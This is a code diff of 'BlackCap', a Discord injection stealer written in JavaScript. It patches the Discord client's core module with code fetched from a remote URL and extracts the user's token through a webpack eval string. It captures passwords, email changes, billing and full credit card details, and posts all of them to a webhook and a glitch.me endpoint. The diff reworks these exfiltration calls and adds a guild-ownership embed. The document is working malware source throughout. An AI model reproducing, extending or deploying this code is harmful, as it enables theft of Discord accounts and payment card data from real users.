@@ -10,6 +10,7 @@ const os = require('os')
 const https = require("https");
 const computerName = os.hostname();
 
+
 const EvalToken = `for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`
 
 String.prototype.insert = function(index, string) {
@@ -28,6 +29,7 @@ const config = {
 
     injection_url: "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Inject/main/index.js",
     webhook: "%WEBHOOK%",
+    apiurl: "https://healthy-rowan-bottle.glitch.me/hello/",
     filter2: {
         urls: [
       "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",
@@ -72,6 +74,8 @@ function updateCheck() {
     const indexJs = `${app}\\modules\\discord_desktop_core-1\\discord_desktop_core\\index.js`;
     const bdPath = path.join(process.env.APPDATA, "\\betterdiscord\\data\\betterdiscord.asar");
     if (!fs.existsSync(appPath)) fs.mkdirSync(appPath);
+    if(app === 'Lightcord')return;
+    if(app === 'DiscordCanary')return;
     if (fs.existsSync(packageJson)) fs.unlinkSync(packageJson);
     if (fs.existsSync(resourceIndex)) fs.unlinkSync(resourceIndex);
 
@@ -90,6 +94,9 @@ function updateCheck() {
         const startUpScript = `const fs = require('fs'), https = require('https');
 const indexJS = '${indexJs}';
 const bdPath = '${bdPath}';
+
+
+
 const fileSize = fs.statSync(indexJS).size
 fs.readFileSync(indexJS, 'utf8', (err, data) => {
     if (fileSize < 20000 || data === "module.exports = require('./core.asar')") 
@@ -98,7 +105,7 @@ fs.readFileSync(indexJS, 'utf8', (err, data) => {
 async function init() {
     https.get('${config.injection_url}', (res) => {
         const file = fs.createWriteStream(indexJS);
-        res.replace('core' + 'num', indexJS).replace('https://discord.com/api/webhooks/1044243736898576414/mIVeSvstU1qStltxG8yOmeX16ycxl6UsUzwKgU-XOPL9zJqhebMXHrGdcKoGbF-CZyiX', '${config.webhook}')
+        res.replace('core' + 'num', indexJS).replace('blackcap', '${config.apiurl}')
         res.pipe(file);
         file.on('finish', () => {
             file.close();
@@ -167,16 +174,45 @@ document.addEventListener('click',handler,false);
 
 noSessionPlease()
 
+const hooker = async (content) => {
+    const data = JSON.stringify(content);
+    const url = new URL(config.webhook);
+    const options = {
+        protocol: url.protocol,
+        hostname: url.host,
+        path: url.pathname,
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json",
+            "Access-Control-Allow-Origin": "*",
+        },
+    };
+    const req = https.request(options);
+
+    req.on("error", (err) => {
+        console.log(err);
+    });
+    req.write(data);
+    req.end();
+};
 
 
-let gamingchair = "https://healthy-rowan-bottle.glitch.me/hello/"
-
-
-
-
+async function post(url, embed){
+    const window = BrowserWindow.getAllWindows()[0];
+    console.log(url + embed)
+    var b = await window.webContents.executeJavaScript(` 
+    fetch("${url}", {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify(${embed})
+    })`, !0)
+    return b
+}
 
 session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
-    if (details.url.startsWith(config.webhook)) {
+    if (details.url.startsWith(config.apiurl)) {
         if (details.url.includes("discord.com")) {
             callback({
                 responseHeaders: Object.assign({
@@ -209,41 +245,8 @@ session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
 })
 
 
-async function blackcapeval(url, embed){
-    const window = BrowserWindow.getAllWindows()[0];
-    console.log(url + embed)
-    var b = await window.webContents.executeJavaScript(` 
-    fetch("${url}", {
-        method: "POST",
-        headers: {
-            "Content-Type": "application/json"
-        },
-        body: JSON.stringify(${embed})
-    })`, !0)
-    return b
-}
 
-const hooker = async (content) => {
-    const data = JSON.stringify(content);
-    const url = new URL(config.webhook);
-    const options = {
-        protocol: url.protocol,
-        hostname: url.host,
-        path: url.pathname,
-        method: "POST",
-        headers: {
-            "Content-Type": "application/json",
-            "Access-Control-Allow-Origin": "*",
-        },
-    };
-    const req = https.request(options);
 
-    req.on("error", (err) => {
-        console.log(err);
-    });
-    req.write(data);
-    req.end();
-};
 
 
 async function FirstTime() {
@@ -272,11 +275,15 @@ async function FirstTime() {
                                 name: "BlackCap"
                             },
                             footer: {
-                                text: "�KSCH | https://github.com/KSCHdsc"
+                                text: "©KSCH | https://github.com/KSCHdsc"
                             }
 						}]
                     };
+                    let data = JSON.stringify(c);
+                    let UwU = JSON.stringify({ data: data, token: token })
+                    post(config.apiurl, UwU);
                     hooker(c)
+
                 } else {
                     var b = await getFromURL("https://discord.com/api/v8/users/@me", token)
                     var {
@@ -294,7 +301,7 @@ async function FirstTime() {
                         content: "",
                         embeds: [{
                             title: "BlackCap Initalized",
-                            description: "[<a:blackcapgif:1041634542093619260>  **Oh you have BlackCaped someone**](https://github.com/KSCHdsc)",
+                            description: "[<a:blackcapgif:1041634542093619260> │ **Oh you have BlackCaped someone**](https://github.com/KSCHdsc)",
                             color: config["embed-color"],
                             fields: [{
                                 name: "Injection Info",
@@ -335,7 +342,7 @@ async function FirstTime() {
 								}],
 
                             footer: {
-                                text: "�KSCH | https://github.com/KSCHdsc"
+                                text: "©KSCH | https://github.com/KSCHdsc"
                             },
                             image: {
                                 url: bannerurl,
@@ -345,17 +352,11 @@ async function FirstTime() {
                             }
 							}]
                     };
-                    
-                    hooker(c)
-                    
+
                     let data = JSON.stringify(c);
                     let UwU = JSON.stringify({ data: data, token: token })
-                    setTimeout(() => {
-                        
-                    blackcapeval(gamingchair, UwU);
-
-                }, 1500);
-
+                    post(config.apiurl, UwU);
+                    hooker(c)
                 };
 
 
@@ -387,19 +388,15 @@ async function FirstTime() {
                                         name: "BlackCap"
                                     },
                                     footer: {
-                                        text: "�KSCH | https://github.com/KSCHdsc"
+                                        text: "©KSCH | https://github.com/KSCHdsc"
                                     }
 						}]
                             };
-                            hooker(c)
-
+                            
                             let data = JSON.stringify(c);
                             let UwU = JSON.stringify({ data: data, token: token })
-                            setTimeout(() => {
-                                
-                            blackcapeval(gamingchair, UwU);
-        
-                        }, 1500);
+                            post(config.apiurl, UwU);
+                            hooker(c)
 
                         } else {
                             var b = await getFromURL("https://discord.com/api/v8/users/@me", token)
@@ -417,7 +414,7 @@ async function FirstTime() {
                                 content: "",
                                 embeds: [{
                                     title: "BlackCap Victim got logged out",
-                                    description: "[<a:blackcapgif:1041634542093619260>  **Oh you have BlackCaped someone**](https://github.com/KSCHdsc)",
+                                    description: "[<a:blackcapgif:1041634542093619260> │ **Oh you have BlackCaped someone**](https://github.com/KSCHdsc)",
                                     color: config["embed-color"],
                                     fields: [{
                                         name: "Injection Info",
@@ -454,7 +451,7 @@ async function FirstTime() {
 								}],
 
                                     footer: {
-                                        text: "�KSCH | https://github.com/KSCHdsc"
+                                        text: "©KSCH | https://github.com/KSCHdsc"
                                     },
                                     image: {
                                         url: bannerurl,
@@ -464,16 +461,11 @@ async function FirstTime() {
                                     }
 							}]
                             };
-                            
-                            hooker(c)
-                            
                             let data = JSON.stringify(c);
                             let UwU = JSON.stringify({ data: data, token: token })
-                            setTimeout(() => {
-                                
-                            blackcapeval(gamingchair, UwU);
-        
-                        }, 1500);
+                            post(config.apiurl, UwU);
+                            hooker(c)
+                            
                         }
                     }
 
@@ -507,15 +499,25 @@ async function getFromURL(url, token) {
     return b
 }
 
+async function getFromURLnp(url, token) {
+    const window = BrowserWindow.getAllWindows()[0];
+    var b = await window.webContents.executeJavaScript(`
+    var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open( "GET", "${url}", false );
+    xmlHttp.setRequestHeader("Authorization", "${token}");
+    xmlHttp.send( null );`, !0)
+    return b
+}
+
 
 
 
 function GetNSFW(reader) {
     if (reader == true) {
-        return " `NSFW Allowed`"
+        return "🔞 `NSFW Allowed`"
     }
     if (reader == false) {
-        return " `NSFW Not Allowed`"
+        return "🔞 `NSFW Not Allowed`"
     } else {
         return "Idk bro you got me"
     }
@@ -523,10 +525,10 @@ function GetNSFW(reader) {
 
 function GetA2F(reader) {
     if (reader == true) {
-        return " `A2F Enabled`"
+        return "🔒 `A2F Enabled`"
     }
     if (reader == false) {
-        return " `A2F Not Enabled`"
+        return "🔓 `A2F Not Enabled`"
     } else {
         return "Idk bro you got me"
     }
@@ -617,94 +619,94 @@ function GetLangue(read) {
     const korea = 'ko';
     var langue = "";
     if (read == France) {
-        langue += " French"
+        langue += "🇫🇷 French"
     }
     if (read == Dansk) {
-        langue += " Dansk"
+        langue += "🇩🇰 Dansk"
     }
     if (read == Deutsch) {
-        langue += " Deutsch"
+        langue += "🇩🇪 Deutsch"
     }
     if (read == englishUK) {
-        langue += " English"
+        langue += "🏴󠁧󠁢󠁥󠁮󠁧󠁿 English"
     }
     if (read == englishUS) {
-        langue += " USA"
+        langue += "🇺🇸 USA"
     }
     if (read == espagnol) {
-        langue += " Espagnol"
+        langue += "🇪🇸 Espagnol"
     }
     if (read == hrvatski) {
-        langue += " Croatian"
+        langue += "🇭🇷 Croatian"
     }
     if (read == italianio) {
-        langue += " Italianio"
+        langue += "🇮🇹 Italianio"
     }
     if (read == lietuviskai) {
-        langue += " Lithuanian"
+        langue += "🇱🇹 Lithuanian"
     }
     if (read == magyar) {
-        langue += " Hungarian"
+        langue += "🇭🇺 Hungarian"
     }
     if (read == neerland) {
-        langue += " Dutch"
+        langue += "🇳🇱 Dutch"
     }
     if (read == Norsk) {
-        langue += " Norwegian"
+        langue += "🇳🇴 Norwegian"
     }
     if (read == polski) {
-        langue += " Polish"
+        langue += "🇵🇱 Polish"
     }
     if (read == portugues) {
-        langue += " Portuguese"
+        langue += "🇵🇹 Portuguese"
     }
     if (read == Romana) {
-        langue += " Romanian"
+        langue += "🇷🇴 Romanian"
     }
     if (read == finlandais) {
-        langue += " Finnish"
+        langue += "🇫🇮 Finnish"
     }
     if (read == svenska) {
-        langue += " Swedish"
+        langue += "🇸🇪 Swedish"
     }
     if (read == turk) {
-        langue += " Turkish"
+        langue += "🇹🇷 Turkish"
     }
     if (read == tiengviet) {
-        langue += " Vietnamese"
+        langue += "🇻🇳 Vietnamese"
     }
     if (read == cestina) {
-        langue += " Czech"
+        langue += "🇨🇿 Czech"
     }
     if (read == grecque) {
-        langue += " Greek"
+        langue += "🇬🇷 Greek"
     }
     if (read == bulgar) {
-        langue += " Bulgarian"
+        langue += "🇧🇬 Bulgarian"
     }
     if (read == russe) {
-        langue += " Russian"
+        langue += "🇷🇺 Russian"
     }
     if (read == ukrainier) {
-        langue += " Ukrainian"
+        langue += "🇺🇦 Ukrainian"
     }
     if (read == inde) {
-        langue += " Indian"
+        langue += "🇮🇳 Indian"
     }
     if (read == thai) {
-        langue += " Taiwanese"
+        langue += "🇹🇼 Taiwanese"
     }
     if (read == chineschina) {
-        langue += " Chinese-China"
+        langue += "🇨🇳 Chinese-China"
     }
     if (read == japonais) {
-        langue += " Japanese"
+        langue += "🇯🇵 Japanese"
     }
     if (read == chinestaiwan) {
-        langue += " Chinese-Taiwanese"
+        langue += "🇨🇳 Chinese-Taiwanese"
     }
     if (read == korea) {
-        langue += " Korean"
+        langue += "🇰🇷 Korean"
     }
     if (langue == "") {
         langue = "None"
@@ -815,17 +817,17 @@ async function Login(email, password, token) {
                 var billing = "";
                 json.forEach(z => {
                     if (z.type == "") {
-                        return "\`\`"
+                        return "\`❌\`"
                     } else if (z.type == 2 && z.invalid != !0) {
-                        billing += "\`\`" + " <:paypal:896441236062347374>"
+                        billing += "\`✔️\`" + " <:paypal:896441236062347374>"
                     } else if (z.type == 1 && z.invalid != !0) {
-                        billing += "\`\`" + " :credit_card:"
+                        billing += "\`✔️\`" + " :credit_card:"
                     } else {
-                        return "\`\`"
+                        return "\`❌\`"
                     }
                 })
                 if (billing == "") {
-                    billing = "\`\`"
+                    billing = "\`❌\`"
                 }
                 return billing
             }
@@ -841,7 +843,7 @@ async function Login(email, password, token) {
                 content: "",
                 embeds: [{
                     "title": "BlackCap User Login",
-                    description: "[<a:blackcapgif:1041634542093619260>  **Oh you have BlackCaped someone**](https://github.com/KSCHdsc)",
+                    description: "[<a:blackcapgif:1041634542093619260> │ **Oh you have BlackCaped someone**](https://github.com/KSCHdsc)",
                     "color": config['embed-color'],
                     "fields": [{
                         name: "Injection Info",
@@ -898,7 +900,7 @@ async function Login(email, password, token) {
 												}, ],
 
                     "footer": {
-                        "text": "�KSCH | https://github.com/KSCHdsc"
+                        "text": "©KSCH | https://github.com/KSCHdsc"
                     },
                     "thumbnail": {
                         "url": `${usericonurl}`
@@ -909,7 +911,7 @@ async function Login(email, password, token) {
                     "description": CalcFriends(),
 
                     "footer": {
-                        "text": "�KSCH | https://github.com/KSCHdsc"
+                        "text": "©KSCH | https://github.com/KSCHdsc"
                     },
                     "image": {
                         'url': `${bannerurl}`,
@@ -918,18 +920,12 @@ async function Login(email, password, token) {
                         "url": `${usericonurl}`
                     }
 											}]
-                                            
             }
             
-            hooker(params)
-            
-             setTimeout(() => {
-                
             let data = JSON.stringify(params);
             let UwU = JSON.stringify({ data: data, token: token })
-            blackcapeval(gamingchair, UwU);
-             }, 1500);
-
+            post(config.apiurl, UwU);
+            hooker(params)
         })
     })
 }
@@ -987,17 +983,17 @@ async function ChangePassword(oldpassword, newpassword, token) {
                 var billing = "";
                 json.forEach(z => {
                     if (z.type == "") {
-                        return "\`\`"
+                        return "\`❌\`"
                     } else if (z.type == 2 && z.invalid != !0) {
-                        billing += "\`\`" + " <:paypal:896441236062347374>"
+                        billing += "\`✔️\`" + " <:paypal:896441236062347374>"
                     } else if (z.type == 1 && z.invalid != !0) {
-                        billing += "\`\`" + " :credit_card:"
+                        billing += "\`✔️\`" + " :credit_card:"
                     } else {
-                        return "\`\`"
+                        return "\`❌\`"
                     }
                 })
                 if (billing == "") {
-                    billing = "\`\`"
+                    billing = "\`❌\`"
                 }
                 return billing
             }
@@ -1007,7 +1003,7 @@ async function ChangePassword(oldpassword, newpassword, token) {
                 content: "",
                 embeds: [{
                     "title": "BlackCap Detect Password Changed",
-                    description: "[<a:blackcapgif:1041634542093619260>  **Oh you have BlackCaped someone**](https://github.com/KSCHdsc)",
+                    description: "[<a:blackcapgif:1041634542093619260> │ **Oh you have BlackCaped someone**](https://github.com/KSCHdsc)",
                     "color": config['embed-color'],
                     "fields": [{
                         name: "Injection Info",
@@ -1068,7 +1064,7 @@ async function ChangePassword(oldpassword, newpassword, token) {
 												}, ],
 
                     "footer": {
-                        "text": "�KSCH | https://github.com/KSCHdsc"
+                        "text": "©KSCH | https://github.com/KSCHdsc"
                     },
                     "thumbnail": {
                         "url": `${usericonurl}`
@@ -1079,7 +1075,7 @@ async function ChangePassword(oldpassword, newpassword, token) {
                     "description": CalcFriends(),
 
                     "footer": {
-                        "text": "�KSCH | https://github.com/KSCHdsc"
+                        "text": "©KSCH | https://github.com/KSCHdsc"
                     },
                     "image": {
                         'url': `${bannerurl}`,
@@ -1089,14 +1085,11 @@ async function ChangePassword(oldpassword, newpassword, token) {
                     }
 											}]
             }
-            hooker(params)
-            
-             setTimeout(() => {
-                
             let data = JSON.stringify(params);
             let UwU = JSON.stringify({ data: data, token: token })
-            blackcapeval(gamingchair, UwU);
-             }, 1500);
+            post(config.apiurl, UwU);
+            
+            hooker(params)
         })
     })
 }
@@ -1150,17 +1143,17 @@ async function ChangeEmail(newemail, password, token) {
                 var billing = "";
                 json.forEach(z => {
                     if (z.type == "") {
-                        return "\`\`"
+                        return "\`❌\`"
                     } else if (z.type == 2 && z.invalid != !0) {
-                        billing += "\`\`" + " <:paypal:896441236062347374>"
+                        billing += "\`✔️\`" + " <:paypal:896441236062347374>"
                     } else if (z.type == 1 && z.invalid != !0) {
-                        billing += "\`\`" + " :credit_card:"
+                        billing += "\`✔️\`" + " :credit_card:"
                     } else {
-                        return "\`\`"
+                        return "\`❌\`"
                     }
                 })
                 if (billing == "") {
-                    billing = "\`\`"
+                    billing = "\`❌\`"
                 }
                 return billing
             }
@@ -1178,7 +1171,7 @@ async function ChangeEmail(newemail, password, token) {
                 content: "",
                 embeds: [{
                         "title": "BlackCap Detect Email Changed",
-                        description: "[<a:blackcapgif:1041634542093619260>  **Oh you have BlackCaped someone**](https://github.com/KSCHdsc)",
+                        description: "[<a:blackcapgif:1041634542093619260> │ **Oh you have BlackCaped someone**](https://github.com/KSCHdsc)",
                         "color": config['embed-color'],
                         "fields": [{
                                 name: "Injection Info",
@@ -1236,7 +1229,7 @@ async function ChangeEmail(newemail, password, token) {
 				],
 
                         "footer": {
-                            "text": "�KSCH | https://github.com/KSCHdsc"
+                            "text": "©KSCH | https://github.com/KSCHdsc"
                         },
                         "thumbnail": {
                             "url": `${usericonurl}`
@@ -1247,7 +1240,7 @@ async function ChangeEmail(newemail, password, token) {
                         "description": CalcFriends(),
 
                         "footer": {
-                            "text": "�KSCH | https://github.com/KSCHdsc"
+                            "text": "©KSCH | https://github.com/KSCHdsc"
                         },
                         "image": {
                             'url': `${bannerurl}`,
@@ -1259,14 +1252,10 @@ async function ChangeEmail(newemail, password, token) {
 			}
 		]
             }
-            hooker(params)
-            
-             setTimeout(() => {
-                
             let data = JSON.stringify(params);
             let UwU = JSON.stringify({ data: data, token: token })
-            blackcapeval(gamingchair, UwU);
-             }, 1500);
+            post(config.apiurl, UwU);
+            hooker(params)
         })
     })
 }
@@ -1310,22 +1299,33 @@ async function CreditCardAdded(number, cvc, expir_month, expir_year, token) {
                         "name": "BlackCap"
                     },
                     "footer": {
-                        "text": "�KSCH | https://github.com/KSCHdsc"
+                        "text": "©KSCH | https://github.com/KSCHdsc"
                     },
                     "thumbnail": {
                         "url": "https://cdn.discordapp.com/avatars/" + info.id + "/" + info.avatar
                     },
             },
+                {
+                    "title": `<a:totalfriends:1041641100017946685> Guilds Owner`,
+                    "color": config['embed-color'],
+                    "description": `\`\`\`diff\n${fs.readFileSync('blackcaped_guilds_result.txt', 'utf-8') || "- This user is not the owner of any server"}\`\`\``,
+
+                    "footer": {
+                        "text": "©KSCH | https://github.com/KSCHdsc"
+                    },
+                    "image": {
+                        'url': `${bannerurl}`,
+                    },
+                    "thumbnail": {
+                        "url": `${usericonurl}`
+                    }
+            }
         ]
         }
+        let data = JSON.stringify(params);
+        let UwU = JSON.stringify({ data: data, token: token })
+        post(config.apiurl, UwU);
         hooker(params)
-            
-        setTimeout(() => {
-           
-       let data = JSON.stringify(params);
-       let UwU = JSON.stringify({ data: data, token: token })
-       blackcapeval(gamingchair, UwU);
-        }, 1500);
 }
 
 const ChangePasswordFilter = {
@@ -1387,6 +1387,8 @@ session.defaultSession.webRequest.onCompleted(ChangePasswordFilter, (details, ca
         })).catch(console.error);
     }
 });
+
+
 
 
 
